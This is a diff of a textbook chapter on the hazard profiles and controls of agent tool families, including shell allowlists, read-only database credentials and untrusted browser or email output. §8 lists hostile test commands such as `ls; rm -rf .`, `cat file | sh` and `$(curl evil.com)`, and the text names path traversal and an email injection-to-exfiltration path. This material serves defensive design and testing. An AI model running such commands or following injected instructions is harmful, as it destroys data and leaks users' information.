@@ -1,189 +1,235 @@
-# Topic 9 — Shell, Filesystem, Browser, Computer-Use, Retrieval, Web-Search, Database, and Communication Tools
+# Topic 9 — The Standard Tool Families: Shell, Filesystem, Browser, Computer-Use, Retrieval, Web-Search, Database, and Communication
 
-## 1. Problem and objective
+## 1. Scope, prerequisites, terminology, boundaries, exclusions, outcomes
 
-“Tool use” hides materially different interfaces. Reading a file, running a shell command, clicking a rendered button, retrieving a semantic passage, updating a database row, and sending a message differ in observation quality, authority, latency, reversibility, and verification. Treating them as interchangeable functions prevents meaningful risk analysis.
+**Scope.** The concrete inventory. Eight families that appear in nearly every agent system, characterized by the two properties that determine their engineering: **effect breadth** (how many effect classes a single tool spans) and **trust class** (whether its output is attacker-reachable).
 
-The objective is to choose the narrowest tool family that exposes the required semantics and to bind it to an executor, resource scope, effect class $\chi_u$, authorization policy $\alpha_u$, and evidence contract. A graphical interface is not inherently safer than an API; a typed database operation is not safe merely because its schema validates.
+**Prerequisites.** Topic 5 (effect classes; per-call classification); Topic 7 (result budgets); Topic 12 is the companion — several families here are *defined* by their untrusted output.
 
-## 2. Intuition: select by semantic distance and control
+**Terminology.** *General-purpose tool*: one whose arguments span effect classes (shell, code exec, SQL, HTTP). *Grounded tool*: one whose output originates outside your authority domain.
 
-Prefer the interface whose operations most directly represent the intended state transition while preserving deterministic checks. If the task is “set invoice status to paid,” a domain API can express the resource, transition, version, and authorization explicitly. A browser click may reach the same outcome, but it relies on screen interpretation, focus, layout, session state, and an indirect postcondition.
+**Boundaries.** Inside: the per-family hazard and result profile, and the specific controls each needs. Outside: domain agent construction (Chapter 11); retrieval architecture (Chapter 6); the threat model (Chapter 12).
 
-This does not imply that APIs always dominate. Browser or computer-use tools are necessary when no suitable API exists, when visual state is itself the evidence, or when the supported workflow is intentionally human-facing. Shell and code execution are powerful aggregation layers when the authority surface is tightly bounded. The correct choice is conditional on task semantics and available controls.
+**Exclusions.** No product comparisons; no browser-automation tutorial.
 
-## 3. A common analytical frame
+**Outcomes.** The reader can classify each family, apply the right control, and recognize the two families that are dangerous in ways their APIs do not reveal.
 
-Represent a candidate tool surface by
+## 2. Problem, bottleneck, objective, assumptions, constraints, success criteria
 
-$$
-u = \bigl(n_u,d_u,\Sigma_u^{\mathrm{in}},\Sigma_u^{\mathrm{out}},
-e_u,\chi_u,\iota_u,\alpha_u,\phi_u\bigr).
-$$
+**Problem.** These eight families are treated as eight tools. They are not: they are eight *hazard profiles*, and applying uniform machinery to them is how agent incidents happen. A `web_search` and a `db_query` have nothing in common operationally — one returns attacker-controlled text, the other returns trusted rows and can drop a table.
 
-For an intended transition $g$, define semantic distance $D_{\mathrm{sem}}(u,g)$ as an evaluation metric measuring the number and ambiguity of intermediate interpretations between a call and $g$. Define observability $O(u)$ as the fraction of relevant prestate, transition evidence, and poststate exposed through typed results. A deployment-specific selection objective is
+**Bottleneck.** Two of the eight — **shell** and **database** — are general-purpose: a single tool spanning read, reversible write, and irreversible write depending on its argument. Topic 5's per-call classification is not an optimization for these; it is the only thing standing between the agent and `DROP TABLE`. And three of them — **web-search, browser, communication** — return content an adversary can write, which makes them prompt-injection carriers by construction (Topic 12).
 
-$$
-J(u\mid g,c)
-\mathrel{=}
-\lambda_D D_{\mathrm{sem}}(u,g)
-+
-\lambda_L\mathbb E[L_u]
-+
-\lambda_C\mathbb E[C_u]
-+
-\lambda_R\mathbb E[\rho_u]
-+
-\lambda_V\bigl(1-O(u)\bigr),
-$$
+**Objective.** A per-family control table that a reader can apply directly.
 
-subject to authorization, availability, and evidence requirements. Here $L_u$ is latency, $C_u$ is monetary or resource cost under a declared accounting boundary, and $\rho_u=\rho(a_u,c)$ is consequence-weighted loss for the candidate action $a_u$, not the contract's effect class $\chi_u$. The weights and metrics are application-specific; the equation is a decision scaffold, not a universal ranking.
+**Assumptions.** The model will eventually propose the worst call each tool permits.
 
-For a proposed action $a$, consequence-weighted loss can be decomposed as
+**Constraints.** Some families (browser, computer-use) have poor result-compression options: a screenshot is not summarizable without loss.
 
-$$
-\rho(a,c)
-\mathrel{=}
-\sum_{h\in\mathcal H}
-\Pr(h\mid a,c)\,C(h,c),
-$$
+**Success criteria.** Every family in your system has its per-call classifier, its result budget, and its trust class set correctly.
 
-where $\mathcal H$ is a set of harms and $C$ their context-dependent consequences. UI automation may raise $\Pr(h\mid a,c)$ through perceptual ambiguity; a high-authority database tool may instead raise $C(h,c)$ through blast radius. Neither risk is captured by syntax validity.
+## 3. Intuition first, then formalization
 
-## 4. Tool-family analysis
+### 3.1 Intuition: two axes, eight families
 
-| Family | Primary semantics | Typical executor and evidence | Principal risks | Strong control pattern |
-|---|---|---|---|---|
-| Shell | Command execution over process and OS resources | Hosted container or application-owned local runtime; stdout, stderr, exit status, artifacts | Arbitrary code, injection, ambient credentials, filesystem/network reach | Isolation, empty environment, allow/deny policy, resource limits, full audit |
-| Filesystem | Read, enumerate, create, patch, move, or delete paths | Local/remote storage API; bytes, metadata, content hash, diff | Traversal, symlink races, overwrite, secret disclosure, partial writes | Canonicalized root, descriptor-relative access, atomic replace, version/hash precondition |
-| Structured browser | DOM/accessibility/network operations | Browser automation runtime; selectors, DOM snapshots, responses | Stale selectors, session confusion, injected page content, hidden UI state | Isolated profile, origin allowlist, locator checks, response/state verification |
-| Computer use | Coordinate-, key-, or screenshot-conditioned UI actions | Isolated browser/VM; screenshots and action results | Perceptual error, focus drift, prompt injection, high-impact clicks | Updated screenshot loop, point-of-risk confirmation, post-action visual verification |
-| Retrieval/file search | Query over indexed private corpus | Search service/vector store; ranked chunks, file metadata, citations | Recall loss, stale index, authorization leakage, misleading rank | Metadata ACL filter, bounded top-$k$, source IDs, freshness and coverage tests |
-| Web search | Query/open/find over external web | Hosted or client search; URLs, snippets, page content, citations | Untrusted content, freshness variance, source quality, data disclosure | Domain policy, source metadata, citation verification, query privacy review |
-| Database | Typed queries and mutations over structured state | DB proxy or service API; rows, affected count, transaction/version | Injection, broad scans, stale reads, lost updates, irreversible writes | Parameterization, row/column policy, transaction, optimistic version, statement limits |
-| Communication | Send, post, publish, schedule, or notify | Service API/MCP/connector; delivery or provider receipt | Acting as user, wrong recipient, privacy breach, social/legal impact | Recipient/content preview, narrow consent, idempotency, delivery and thread verification |
+The families sort on two questions, and everything else follows:
 
-The table gives typical properties, not guarantees. A “filesystem” may be an eventually consistent object store; a “database” tool may wrap a business API; a “browser” tool may expose both DOM and pixels. Classify the actual executor and contract.
+**"Can one call of this tool do anything, depending on its argument?"** — Shell, code execution, SQL, and generic HTTP say yes. These are **general-purpose tools**, and they are the ones where a static effect class is a lie. The rest have narrow, fixed effects.
 
-### 4.1 Shell tools
+**"Could an adversary have written the bytes this returns?"** — Web search, browser, email/communication ingestion, and third-party MCP say yes. These are **grounded tools** whose output is untrusted data (Topic 12), and every one of them is a prompt-injection carrier.
 
-Shell exposes a compact language for composing processes and files, which makes it effective for inspection, transformation, builds, and deterministic automation. It also gives a small textual proposal access to a potentially enormous authority surface.
+The families that answer *yes to both* are the most dangerous objects in an agent system, and browser tools are the canonical case: a browser can navigate (read), submit forms (irreversible write), and returns page content an attacker fully controls.
 
-OpenAI's current Responses shell tool supports both provider-hosted containers and application-executed local environments under the shell call/result lifecycle [OSH]. The executor location changes data residence, credentials, installed software, persistence, and incident ownership even when the model-facing abstraction is similar. The same documentation warns that arbitrary shell commands require sandboxing, allowlists or denylists where possible, and audit logging [OSH].
+### 3.2 Formalization: the hazard profile
 
-Do not validate shell safety with string matching alone. Shell grammars include substitution, redirection, pipelines, environment expansion, and interpreter-specific behavior. Prefer argument-vector tools or dedicated operations when possible. If a shell is required, combine OS isolation, a restricted working root, network policy, resource limits, secret minimization, and execution logging.
+For family $f$ define $\mathrm{haz}(f)=(\beta_f,\ \theta_f,\ \omega_f)$ where $\beta_f$ = **effect breadth** (the number of classes in $\{\textsf{R},\textsf{W}_{\mathrm{rev}},\textsf{W}_{\mathrm{irr}}\}$ its calls can occupy), $\theta_f$ = **trust class** of its output, $\omega_f$ = **result compressibility** (can $\Sigma^{\mathrm{out}}$ be reduced without losing task-relevant signal). **[synthesis]**
 
-### 4.2 Filesystem tools
+| Family | $\beta_f$ | $\theta_f$ | $\omega_f$ | The control that actually matters |
+|---|:--:|---|---|---|
+| **Shell** | **3** | Trusted (own output) | High | **Per-call classification with a command allowlist** (Topic 5, §6). Never a denylist. |
+| **Filesystem** | 3 | Mixed — *file contents are untrusted* | High | Path confinement (no `..`, no symlink escape); read/write split; **file content is data** |
+| **Browser** | **3** | **Untrusted** | **Low** | The worst cell in the table: full effect breadth, attacker-controlled content, screenshots that resist compression |
+| **Computer-use** | **3** | **Untrusted** | **Low** | As browser, plus: no semantic action boundary at all — a click is a click |
+| **Retrieval (own corpus)** | 1 (R) | Mixed — *documents may be user-supplied* | High | Result budget; provenance; **corpus poisoning is real** if users can write to it |
+| **Web search** | 1 (R) | **Untrusted** | Medium | Injection carrier. Provenance + no-act-on-instructions (Topic 12) |
+| **Database** | **3** | Trusted | High | **Per-call classification; separate read-only credentials; no DDL** |
+| **Communication** (email, chat, ticket) | 2–3 | **Untrusted inbound** | Medium | **Irreversible outbound** (E4, Topic 5) + **untrusted inbound** (Topic 12). Both, at once. |
 
-Filesystem authorization should operate on the resolved object, not only the user-supplied path string. A safe write resolves and opens beneath an authorized root, rejects traversal and unsafe link behavior, checks the expected version or hash, writes to a temporary sibling, flushes as required, and atomically replaces the target where the filesystem supports it.
+**[derived — the table is ours; the underlying mechanisms are sourced in §5.]**
 
-For a patch with expected digest $h_0$, the precondition is
+The two rows to internalize:
 
-$$
-H(\text{current bytes}) = h_0.
-$$
+**Browser and computer-use are $\beta=3$, untrusted, and incompressible simultaneously.** They are the only family with all three adverse properties, and they are exactly the family teams add most casually ("let it browse the web"). A browser tool grants an agent an irreversible write channel (any form on the internet), fed by content an attacker controls, with results you cannot cheaply compress.
 
-After the write, verify both the new digest and the intended diff. A successful system call is not proof that the correct file changed.
+**Communication tools are the injection loop.** Inbound email is attacker-written; outbound email is irreversible and leaves your authority domain forever. An agent that reads and sends email has a complete attacker-controlled path from injected instruction to exfiltrated data, and it is a single tool pair.
 
-### 4.3 Structured browser and computer-use tools
+## 4. Architecture
 
-Structured browser automation addresses elements and network state; computer use acts through rendered observations and input events. Structured access usually reduces perceptual ambiguity, while pixels can cover applications without stable automation hooks.
-
-Computer use is a closed observation-action loop:
-
-$$
-X_t^{\mathrm{screen}}
-\longrightarrow \widetilde A_t^{\mathrm{UI}}
-\longrightarrow A_t^{\mathrm{UI}}
-\longrightarrow X_{t+1}^{\mathrm{screen}}.
-$$
-
-The next action must be conditioned on an updated observation when the UI may have changed. OpenAI's current guide supports batched UI `actions[]` but still requires updated screenshots and advises isolated execution, untrusted treatment of page content, and confirmation immediately before high-impact actions [OCU]. A batch is safe only when its internal actions do not cross an observation or approval boundary.
-
-### 4.4 Retrieval and web search
-
-Retrieval searches an indexed, usually curated corpus; web search queries an external, mutable information environment. Retrieval can offer stronger corpus identity and access control, but index freshness and chunking can hide evidence. Web search improves freshness and breadth but introduces adversarial content, source-quality variance, and privacy concerns around queries.
-
-OpenAI's file-search interface supports result-count limits and metadata filters, explicitly trading token use and latency against answer quality [OFS]. Its web-search interface returns URL citation annotations and can expose the broader consulted source list; rendered citations must remain visible and clickable when web-derived information is shown to users [OAI-WEB]. These are provider-specific response semantics, while the general invariant is source-addressable evidence.
-
-### 4.5 Database tools
-
-Do not expose unrestricted SQL merely because the model can write it. Prefer domain-shaped read and mutation operations with parameterized inputs, bounded predicates, statement timeouts, row limits, and database-enforced access control. If SQL is necessary, use a proxy that parses and plans statements, restricts schemas and verbs, applies a read-only transaction where applicable, and rejects unbounded or multi-statement execution.
-
-Mutations should include optimistic concurrency:
-
-$$
-\operatorname{UPDATE}(r,v_{\mathrm{expected}},\Delta)
-\text{ succeeds only if }
-v(r)=v_{\mathrm{expected}}.
-$$
-
-The affected-row count must be interpreted. Zero may mean stale version, missing resource, or denied scope; it is not automatically a successful no-op.
-
-### 4.6 Communication tools
-
-Sending a message, publishing a post, creating a ticket, or scheduling a meeting changes another person's information environment and may legally or socially represent the user. The executor should bind the authenticated sender, normalize recipients, display the exact audience and payload at the point of approval when required, and return a durable provider or thread identifier.
-
-“API accepted” is a transport observation, not proof of delivery or human receipt. Define the required postcondition—queued, delivered, posted, or acknowledged—and verify at that level.
-
-## 5. Design methodology
-
-```text
-INPUT: intended outcome g, authenticated context c, candidate tool contracts U
-OUTPUT: admitted tool plan P or a typed infeasibility result
-
-1. Derive required resources, operations, evidence, latency, and reversibility from g.
-2. Remove tools whose executor, authority, or data-residency boundary is incompatible.
-3. Remove tools that cannot expose the required prestate and postcondition evidence.
-4. Estimate semantic distance, latency, cost, and consequence-weighted loss.
-5. Prefer the narrowest typed operation on the Pareto frontier.
-6. Add deterministic preconditions, budgets, authorization, and point-of-risk approval.
-7. Define executor-specific postconditions and recovery behavior.
-8. Execute one observation-dependent segment at a time.
-9. Verify the resulting state through an independent or authoritative observation.
-10. Record proposal, admission, executor, resources, results, and verification evidence.
+```
+   GENERAL-PURPOSE (β=3)                    GROUNDED (θ=untrusted)
+   ┌────────────────────────┐               ┌──────────────────────────┐
+   │ shell, code exec,      │               │ web search, browser,     │
+   │ SQL, generic HTTP      │               │ email inbound, 3P MCP    │
+   │                        │               │                          │
+   │ REQUIRES:              │               │ REQUIRES:                │
+   │  per-call classifier   │               │  provenance envelope     │
+   │  allowlist (not deny)  │               │  data≠control (CP-1)     │
+   │  scoped credentials    │               │  no-act-on-instructions  │
+   └────────────────────────┘               └──────────────────────────┘
+              │                                          │
+              └────────────┬─────────────────────────────┘
+                           ▼
+                  ┌──────────────────────┐
+                  │ BOTH: browser,       │  ← the maximum-hazard cell
+                  │ computer-use,        │     β=3 AND untrusted
+                  │ communication        │
+                  └──────────────────────┘
 ```
 
-For $n$ candidate tool surfaces and constant-time contract predicates, filtering is $O(n)$. Pareto-front construction is $O(n^2)$ by naive pairwise dominance and is inappropriate for unbounded catalogs; fixed-dimensional algorithms or incremental indexes can reduce cost, but in practice discovery should first produce a bounded $n$. Estimation callbacks may dominate local complexity when they query policy engines, planners, or remote health data.
+**Credential scoping is the family-level control that generalizes.** For every general-purpose family, the blast radius is set by the *credential*, not by the tool. A database tool with a read-only role cannot drop a table no matter what SQL the model writes; a shell in a container with no network cannot exfiltrate. **Scope the credential to the effect class you intend, and the tool's breadth stops mattering.** This is strictly more robust than argument inspection, because it does not depend on your parser being cleverer than the model.
 
-## 6. Failure modes
+## 5. Grounding
 
-| Failure | Example | Mitigation |
+- **Sandbox modes as the shell/filesystem control surface:** Codex documents `read-only`, `workspace-write`, and `danger-full-access` sandbox modes, with approval policies `untrusted` / `on-request` / `never`, and platform sandboxing via Seatbelt and bubblewrap [CDX]. The mode names *are* the effect classification (Topic 5), applied to the shell family.
+- **Argument- and context-dependent hazard, which is the formal basis of $\beta_f=3$:** "The same command may be safe in a disposable sandbox but unsafe in a production repository, and the same network request may be benign during documentation retrieval but risky when it transmits local state" [CAH §5]. This sentence is *about* the general-purpose families.
+- **Environment-interaction tools as a first-class class:** the survey's taxonomy separates function-oriented tools from environment-interaction tools that "allow agents to act over repositories and execution environments," and verification-driven tools that "provide deterministic feedback" [CAH §3.3] — test runners, compilers, and linters are a family this topic inherits from Chapter 3's verification sensors.
+- **Code-defined environments and executable feedback:** WebArena, OSWorld, AndroidWorld, and Spider2-V expose Playwright-style code actions whose execution is ground truth, with per-task checkers interrogating post-action system state [CAH §3.3]. This grounds the browser/computer-use family's *action* representation.
+- **Grounding as the bottleneck for computer-use:** the survey cites SeeAct's analysis "showing that grounding, rather than planning, is the dominant bottleneck on Mind2Web" [CAH §3.3]. **This is a directly relevant, sourced finding: for GUI agents the interface layer — not the reasoning — is where the failures are.** It is Chapter 5's thesis, confirmed in the hardest tool family.
+- **Consolidation examples map onto these families:** `search_logs` over `read_logs`; `get_customer_context` over three lookups [WTA] — the filesystem and database families are exactly where the brute-force-search anti-pattern bites.
+- **The 25,000-token cap** [WTA] applies hardest here: shell output, file reads, and search results are the unbounded-result families.
+
+**Evidence gaps.** No source provides comparative reliability data across families. The hazard table is a derivation from documented semantics and the effect-class framework, not a measured ranking. The SeeAct grounding result [CAH §3.3] is the only *measured* family-specific bottleneck available.
+
+## 6. Implementation
+
+**Shell — allowlist, per call, with context:**
+
+```python
+READ_ONLY = {"ls", "cat", "grep", "rg", "find", "head", "tail", "wc", "diff",
+             "git status", "git log", "git diff"}          # ALLOWLIST. Never a denylist.
+
+def classify_shell(args, ctx) -> Effect:
+    cmd = args["command"]
+    # A denylist loses to `sh -c`, `$(...)`, `;`, `&&`, `|`, base64, and novel binaries.
+    if any(ch in cmd for ch in ";|&$`>()"):
+        return Effect.WRITE_IRREVERSIBLE          # composition ⇒ assume the worst
+    head = " ".join(shlex.split(cmd)[:2])
+    if head in READ_ONLY or shlex.split(cmd)[0] in READ_ONLY:
+        return Effect.READ
+    return (Effect.WRITE_REVERSIBLE if ctx.workspace.is_disposable   # [CAH §5]
+            else Effect.WRITE_IRREVERSIBLE)
+```
+
+The metacharacter check is not paranoia. **Any shell metacharacter defeats argument inspection**, so a command containing one cannot be classified as read — it must fall to the worst class. This is the only sound way to inspect shell arguments, and it is why the credential/sandbox scoping of §4 matters more than the parser.
+
+**Database — the credential is the control:**
+
+```python
+db_query = ToolContract(                       # read path
+    name="db_query", effect=Effect.READ,
+    executor="readonly_replica",               # ← a role that CANNOT write. This is the control.
+    output=OutputContract(budget_tokens=10_000, default_limit=100),
+    ...)
+
+db_execute = ToolContract(                     # write path — a SEPARATE tool
+    name="db_execute", effect=Effect.DYNAMIC,
+    authorize=deny_ddl_and_unbounded_updates,  # no DROP/TRUNCATE/ALTER; UPDATE requires WHERE
+    idempotency=IdempotencyContract(key_fields=["statement_id"]),
+    ...)
+```
+
+Splitting read and write into two tools with two credentials is worth more than any amount of SQL parsing. `db_query` on a read-only replica **cannot** cause a write, whatever the model emits. That is a guarantee; a parser is a hope.
+
+**Browser and communication — trust class is not optional:**
+
+```python
+browser_read = ToolContract(
+    name="browser_get_page", effect=Effect.READ,
+    trust=Trust.UNTRUSTED,                     # page content is attacker-authored
+    output=OutputContract(budget_tokens=15_000),
+    provenance=Provenance(source="web", url_required=True),   # Topic 12
+    ...)
+
+email_send = ToolContract(
+    name="email_send", effect=Effect.WRITE_IRREVERSIBLE,      # leaves your domain forever
+    authorize=require_recipient_allowlist_and_confirmation,   # E1 + gate (Topic 5)
+    idempotency=IdempotencyContract(key_fields=["message_id"]),   # E2
+    ...)
+```
+
+The pairing of `email_read` (untrusted inbound) with `email_send` (irreversible outbound) in the same agent is the injection-to-exfiltration path of §3.2. If both exist, the recipient allowlist is not a nicety — it is the control that bounds the damage.
+
+## 7. Trade-offs
+
+| Family | The capability you want | What you are actually buying |
 |---|---|---|
-| Wrong abstraction | Pixel clicks used where a typed API exists | Interface selection evaluation and semantic-distance review |
-| Executor confusion | Hosted shell assumed to see local files | Explicit executor and mounted-resource contract |
-| Observation staleness | UI changes after screenshot | Fresh observation before dependent action |
-| Ambient authority | Local process inherits cloud credentials | Empty environment and capability-scoped broker |
-| Injection | Web page or tool output supplies hostile instructions | Untrusted-content labeling; never treat content as authorization |
-| Weak verification | Exit code zero or HTTP 200 treated as outcome success | Domain-specific postcondition query |
-| Broad query | Model scans full table or corpus | Indexed filters, row/result limits, timeouts |
-| Recipient ambiguity | Message sent to wrong “Alex” | Stable recipient ID plus human-readable preview |
-| Citation loss | Search answer survives without source metadata | Preserve URL/file identifiers through result shaping |
-| Cross-tool identity mismatch | Browser account and API credential refer to different tenant | Principal/account binding and trace correlation |
+| Shell | Universality — it can do anything | It can do anything |
+| Filesystem | Direct workspace access | Path traversal; unbounded reads; untrusted file contents |
+| Browser | The whole web | An irreversible-write channel on every form, fed by attacker text, with incompressible results |
+| Computer-use | Any GUI | The above, plus no action semantics: you cannot allowlist a click |
+| Retrieval | Grounded answers | Corpus poisoning if users can write to the corpus |
+| Web search | Fresh knowledge | The cleanest prompt-injection carrier in existence |
+| Database | Structured truth | DDL, unbounded updates, and full-table reads |
+| Communication | The agent can act in the org | Irreversible outbound + untrusted inbound in one agent |
 
-## 7. Limitations and evidence boundaries
+**The trade the table is really making.** Every one of these families is added because it *increases capability*, and every one increases hazard by the same mechanism. The engineering question is never "is this tool useful" — it always is. It is **"can I scope the credential and classify the call well enough that the hazard is bounded?"** Where the answer is no — computer-use is the honest example, since a click has no semantics to inspect — the correct control is not a better parser but a **smaller authority domain**: a throwaway VM, a test account, no production credentials.
 
-No taxonomy fully separates these families. Shell can call databases; browser automation can download files; MCP can expose every family; a communication API may persist data in a database. The family label is useful only when accompanied by executor, authority, resource, state, and evidence semantics.
+## 8. Experiments
 
-Provider tools evolve. Availability, action formats, citation objects, confirmation defaults, retention, and supported models must be rechecked at deployment. Documentation demonstrates interface behavior, not reliability under a different workload or threat model.
+**Per-family result-size distributions.** p50, p95, and **max** for shell output, file reads, search results, and page content. The max is what ends runs. Most teams have never looked.
 
-## 8. Production implications and connections
+**Classifier evaluation (shell, SQL) — the important one.** Build a labeled set of commands spanning the three effect classes, *including adversarial compositions* (`ls; rm -rf .`, `cat file | sh`, `$(curl evil.com)`, base64-encoded payloads). Measure the classifier as a detector:
 
-- Maintain a registry that records family, executor, effect class, resource scope, data residence, and verification method.
-- Do not share broad credentials across unrelated families; compromise of a retrieval tool should not imply communication or mutation authority.
-- Set family-specific budgets: process limits for shell, path roots for files, origins for browsers, rows for databases, recipients for communication.
-- Evaluate the same outcome through competing surfaces where possible; disagreement exposes hidden semantics.
-- Preserve an end-to-end causal trace across nested tools and executor boundaries.
+- **False-negative rate on writes** — a write classified as read. **This is the number that matters, and it must be zero**; report the zero-failure bound $p_{\max}=1-(1-\gamma)^{1/n}$ with its $n$ (Chapter 1, Topic 12).
+- False-positive rate on reads — a read classified as a write. Costs usability, not safety. Tolerate it.
 
-Topic 2 distinguishes hosted, local, remote, MCP, and agent tools by placement. This topic classifies what those tools do. Topic 7 shapes their observations, Topic 10 enforces their preconditions and ownership, Topic 11 handles retry and partial success, and Chapter 12 expands the threat model.
+**Injection testing (browser, web search, email, retrieval).** Inject instruction-bearing content into the untrusted channel; measure the rate at which the agent acts on it. This is Topic 14's protocol, applied per family, and it is the only way to know whether your data/control boundary holds.
 
-## 9. Page-level sources
+**Grounding evaluation (computer-use).** Per the SeeAct finding that grounding rather than planning is the bottleneck [CAH §3.3], measure action-grounding accuracy separately from plan quality — otherwise a grounding failure is misattributed to reasoning, and you will tune the wrong thing.
 
-- [OpenAI, *Shell*](https://developers.openai.com/api/docs/guides/tools-shell) [OSH]
-- [OpenAI, *Computer use*](https://developers.openai.com/api/docs/guides/tools-computer-use) [OCU]
-- [OpenAI, *File search*](https://developers.openai.com/api/docs/guides/tools-file-search) [OFS]
-- [OpenAI, *Retrieval*](https://developers.openai.com/api/docs/guides/retrieval)
-- [OpenAI, *Web search*](https://developers.openai.com/api/docs/guides/tools-web-search) [OAI-WEB]
-- [OpenAI, *MCP and Connectors*](https://developers.openai.com/api/docs/guides/tools-connectors-mcp) [OMCP]
-- [Model Context Protocol, *Tools specification (2025-06-18)*](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) [MCP]
-- [Google ADK, *Tools and Integrations*](https://adk.dev/tools/) [ADK-T]
+**Statistics.** Wilson intervals on all rates; clustered bootstrap where tasks are the unit (Chapter 1, Topic 12).
+
+## 9. Failure modes, edge cases, hazards, mitigations, open limitations
+
+- **Shell denylist.** Defeated by composition, encoding, or a binary you did not think of. **The failure is silent and total.** Mitigation: allowlist; metacharacter rejection; sandbox authority.
+- **`rm -rf` via argument.** Static classification of `bash` as one class. Mitigation: per-call (Topic 5).
+- **Path traversal.** `../../../etc/passwd`, symlink escape. Mitigation: canonicalize and confine; deny symlinks crossing the root.
+- **Unbounded file read.** A 2 GB log. Mitigation: budget + range selection [WTA].
+- **DDL through the query tool.** Mitigation: read-only credential — the control that cannot be talked around.
+- **Unbounded `UPDATE` without `WHERE`.** Mitigation: require a predicate; cap affected rows.
+- **Browser form submission.** The agent buys something, posts something, deletes an account. Mitigation: classify navigation vs. submission; gate submission (E1/E2, Topic 5).
+- **Prompt injection via page, search result, email, or poisoned corpus document.** The dominant hazard of the grounded families. Mitigation: Topic 12, in full.
+- **Screenshot cost.** Computer-use results resist compression; context fills with images. Mitigation: budget; downscale; prefer accessibility-tree text where available.
+- **Retrieval corpus poisoning.** If users can write to the corpus, retrieval is an untrusted channel wearing a trusted label. Mitigation: trust class by *document provenance*, not by store.
+- **Edge case — the verification-driven family.** Test runners and compilers [CAH §3.3] are the one family whose output is *trusted and deterministic*, which makes them the harness's verification sensors (Chapter 3, Topic 7). Protect that property: a test runner that executes repository code is executing *untrusted* code, and its output is only trustworthy if the harness — not the repo — controls the command.
+- **Open limitation.** Computer-use has **no semantic action boundary**. A click cannot be allowlisted the way a command can. There is no known control other than a reduced authority domain, and this is an unsolved problem, not a gap in this chapter's coverage.
+
+## 10. Verified observations, decision rules, production implications, connections
+
+**Verified observations.**
+1. Platform sandbox modes (`read-only` / `workspace-write` / `danger-full-access`) and approval policies are the shipped control surface for the shell/filesystem family [CDX].
+2. Hazard depends on argument *and* environment, not tool identity [CAH §5].
+3. Environment-interaction and verification-driven tools are distinct classes with distinct feedback properties [CAH §3.3].
+4. For GUI agents, **grounding rather than planning is the dominant bottleneck** [CAH §3.3, citing SeeAct on Mind2Web] — the interface, not the reasoning.
+
+**Decision rules.**
+- **General-purpose tool ⇒ per-call classification + allowlist + scoped credential.** All three. A denylist is not a control.
+- **Grounded tool ⇒ untrusted output.** Provenance envelope, and data must not act as control (Topic 12).
+- **Browser or computer-use ⇒ assume the worst on all three axes.** Give it a throwaway authority domain, not production credentials.
+- **Read and write ⇒ two tools, two credentials.** Especially for databases. The credential is the guarantee; the parser is a hope.
+- **If an agent both reads untrusted mail and sends mail, it has an exfiltration path.** Bound it with a recipient allowlist or do not give it both.
+
+**Production implications.**
+1. Audit the eight families against §3.2's table; most systems have at least one $\beta=3$ tool with a static class.
+2. Replace every denylist with an allowlist this week.
+3. Split read/write credentials for databases and filesystems — the highest-return control in the topic.
+4. Run the classifier false-negative experiment (§8) and report it with $n$. Until then, you do not know your shell tool is safe; you have merely not seen it fail.
+
+**Connections.** Topic 5's per-call classification is *mandatory* for four of these families. Topic 7's budgets bind hardest here. Topic 8's code execution is the shell family taken to its architectural conclusion — and inherits every hazard in this topic. Topic 12 owns the grounded families' trust problem. Chapter 11 builds domain agents on top of these families; Chapter 12 supplies the sandbox and threat model that the general-purpose families require to be safe at all.
+
+## Sources
+
+[CDX] OpenAI Codex documentation — sandbox modes (`read-only`, `workspace-write`, `danger-full-access`); approval policies (`untrusted`, `on-request`, `never`); Seatbelt / bubblewrap platform sandboxing — https://learn.chatgpt.com/docs/agent-approvals-security
+[CAH] Code as Agent Harness, arXiv:2605.18747 (`Knowledge_source/2605.18747v1.pdf`) §3.3 (function-oriented / environment-interaction / verification-driven / workflow-orchestration tool classes; code-defined environments and executable feedback — WebArena, OSWorld, AndroidWorld, Spider2-V; **SeeAct's finding that grounding, rather than planning, is the dominant bottleneck on Mind2Web**), §5 ("the same command may be safe in a disposable sandbox but unsafe in a production repository, and the same network request may be benign during documentation retrieval but risky when it transmits local state")
+[WTA] Anthropic, "Writing effective tools for agents" — `search_logs` over `read_logs`; `get_customer_context`; the 25,000-token response cap; pagination, range selection, filtering, truncation — https://www.anthropic.com/engineering/writing-tools-for-agents
+[CAL] Claude Agent SDK — parallel read-only / serialized write execution, which these families inherit — https://code.claude.com/docs/en/agent-sdk/agent-loop
